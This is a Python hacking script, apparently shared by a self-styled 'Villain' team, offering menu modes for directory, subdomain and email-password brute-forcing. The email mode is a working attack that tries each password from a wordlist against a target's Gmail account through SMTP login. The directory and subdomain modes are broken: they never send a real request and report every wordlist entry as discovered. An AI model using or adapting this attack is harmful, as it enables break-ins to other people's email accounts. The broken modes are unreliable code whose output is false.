#!/usr/bin/python
import requests
from termcolor import colored
from pyfiglet import Figlet
import smtplib as smtp

custom_fig = Figlet(font='big')
print(custom_fig.renderText("  Vill4!n'S Team"))
print("====================================================================")
print("|||||||||||||||||||||||||||||||||||||||||||  Develop by MR_VILLAIN |")
print("======================= Only for Vill4!n'S =========================")
print("====================================================================")
print("")
print("")
print(colored("[1] For Dircetory Broutforce", 'yellow'))
print(colored("[2] For Subdomain Broutforce", 'blue'))
print(colored("[3] For E-mail Password Broutforce", 'green'))
print(colored("[4] For Quite This ", 'cyan'))
print(colored("[*] Select 1 or 2 or 3 or 4", 'red'))
selection=int(input("[*] Select your Mode [1 or 2 or 3 or 4]: "))
if selection==1:

	def request(url):
		try:
			return requests.get("http:// + url")

		except requests.exceptions.ConnectionError:
			pass


	terget_url = input("[*] Enter Terget Url : ")

	wordlist = input("Enter Your Wordlist : ")
	file = open(wordlist, "r")
	for line in file:
		word = line.strip()
		full_url = terget_url + "/" ,word
		response = requests
		if response:
			print("[+] Discovered Dircetory At This Link : " , full_url)
		

if selection==2:
	def request(url):
		try:
			return requests.get("http:// + url")

		except requests.exceptions.ConnectionError:
			pass


	terget_url = input("[*] Enter Terget Url : ")
	wordlist = input("[*] Enter your Wordlist File :")

	file = open(wordlist, "r")
	for line in file:
		word = line.strip()
		full_url = terget_url + "/" ,word
		response = requests
		if response:
			print("[+] Discovered Dircetory At This Link : " , full_url)
		
if selection==3:
	custom_fig = Figlet(font='slant')
	print(custom_fig.renderText(' MR_VILLAIN '))

	print("                       Coded By MR_VILAIN      ")
	print("                                         Member of V1LL41N'S TEAM            ")


	smtpserver = smtp.SMTP("smtp.gmail.com", 587)
	smtpserver.ehlo()
	smtpserver.starttls()

	user = input("[*] Enter Tergets Email Address : ")
	passwordfile = input("[*] Enter Password File (example : pass.txt) : ")
	file = open(passwordfile, 'r')
	for Password in file:
		Password = Password.strip('\n')
		try :
			smtpserver.login(user , Password)
			print(colored("[+ Password Found]: %s" % Password, 'green'))
			break
		except smtp.SMTPAuthenticationError:
			print(colored("[-] Wrong Password : " + Password , 'red'))

	print("Not Matched :'(")

	exit()
elif selection==4:
	print("Good Bye")
	print("See You Again")
	exit()